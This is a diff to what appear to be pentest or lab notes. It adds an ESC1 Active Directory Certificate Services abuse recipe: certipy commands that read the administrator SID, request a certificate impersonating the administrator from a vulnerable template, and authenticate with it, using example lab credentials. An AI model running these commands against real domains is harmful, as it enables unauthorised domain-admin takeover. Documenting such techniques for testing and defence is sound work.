@@ -1045,6 +1045,31 @@ we can go check the user and see if we can get access to that user ,
 then once we do , we can use certipy with -vulnerable to be able to get the ESC number ,
 and from there we can go and check how to abuse it . 
 
+# ESC1 :
+
+1/ Get the Admin SID :
+certipy-ad  account -u 'SVC_CA' -p 'Weak123@' -dc-ip 10.1.240.197 -user 'administrator' read
+
+2/ Request the Certificate :
+
+Standard : 
+certipy req \
+    -u 'attacker@corp.local' -p 'Passw0rd!' \
+    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+    -ca 'CORP-CA' -template 'VulnTemplate' \
+    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+Eg:
+
+certipy-ad req \
+    -u 'SVC_CA@Welcome.local' -p 'Weak123@' \   
+    -dc-ip $target -target 'DC01.WELCOME.local' \
+    -ca 'WELCOME-CA' -template 'Welcome-Template' \
+    -upn 'administrator@welcome.local' -sid 'S-1-5-21-141921413-1529318470-1830575104-500' 
+
+3/ Authenticate using the certificate :
+certipy auth -pfx 'administrator.pfx' -dc-ip $target
+
+
 # ESC8 Abuse :
 
 - Coercing authentication from a high-privileged machine account (e.g. DC$) using tools like Coercer or PetitPotam , nxc ... 
